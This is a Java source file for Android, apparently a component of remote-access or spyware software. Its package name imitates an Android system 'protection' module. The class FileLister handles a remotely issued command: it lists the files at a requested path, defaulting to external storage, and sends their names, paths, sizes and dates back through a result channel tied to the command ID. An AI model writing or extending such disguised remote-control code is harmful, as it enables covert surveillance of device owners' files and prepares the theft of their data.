package com.android.system.protection.commands;

import android.content.Context;
import android.os.Environment;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;

public class FileLister {

    public static void list(Context context, JSONObject params, String commandId) {
        String path = params.optString("path", Environment.getExternalStorageDirectory().getAbsolutePath());
        File dir = new File(path);
        JSONArray filesArray = new JSONArray();

        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    try {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("path", file.getAbsolutePath());
                        fileObj.put("size", file.length());
                        fileObj.put("isDirectory", file.isDirectory());
                        fileObj.put("lastModified", file.lastModified());
                        filesArray.put(fileObj);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }

        JSONObject result = new JSONObject();
        try {
            result.put("files", filesArray);
            result.put("current_path", path);
        } catch (Exception e) {}
        CommandProcessor.sendResult(context, commandId, result);
    }
}